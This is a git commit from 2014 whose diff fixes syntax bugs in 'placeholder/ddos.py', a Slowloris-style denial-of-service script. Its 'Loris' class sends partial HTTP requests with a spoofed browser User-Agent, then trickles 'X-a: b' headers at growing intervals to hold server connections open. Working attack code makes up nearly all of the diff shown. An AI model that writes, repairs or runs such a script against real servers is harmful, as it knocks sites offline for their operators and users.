9515582b84294ba00bb66ad10572667d16ff1ba8
Ubuntu <ubuntu@ip-172-31-29-235.us-west-2.compute.internal>
2014-11-06 22:27:01 +0000

    fixed some of the syntactical problems; apparently the connection is good

--- placeholder/ddos.py
+++ placeholder/ddos.py
@@ -53,12 +53,12 @@ class Loris:
         "Host: " + str(self.addr) + ":" + str(self.port) + "\r\n" +\
         "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n" +\
         "Content-Length: 42\r\n"
-        if sockets[i] is not None:
-            sent = sockets[i].send(payload)
+        if sock is not None:
+            sent = sock.send(payload)
             if sent is not len(payload):
                 return -1
         for i in range(1, self.MAX_TIMEOUT):
-            print "Attempting a " + i + " second timeout"
+            print "Attempting a " + str(i) + " second timeout"
             time.sleep(i)
             message = "X-a: b\r\n"
             sent = sock.send(message)
